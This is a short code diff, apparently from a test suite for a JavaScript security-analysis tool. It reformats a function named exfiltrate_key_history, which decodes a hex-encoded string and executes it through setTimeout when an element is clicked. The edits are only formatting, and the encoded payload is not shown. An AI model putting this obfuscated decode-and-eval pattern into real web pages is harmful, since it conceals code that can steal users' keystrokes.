@@ -4,12 +4,12 @@ function exfiltrate_key_history() {
   var dec = "";
   var i$$1 = 0;
   var v0 = i$$1 < exp.length;
-  for(;v0;) {
+  for (;v0;) {
     dec = dec + String.fromCharCode(parseInt(exp.substr(i$$1, 2), 16));
     i$$1 = i$$1 + 2;
-    v0 = i$$1 < exp.length
+    v0 = i$$1 < exp.length;
   }
   JAM.call(setTimeout, null, [dec, 10]);
-  return
+  return;
 }
 JAM.set(document.getElementById("test"), "onclick", exfiltrate_key_history)
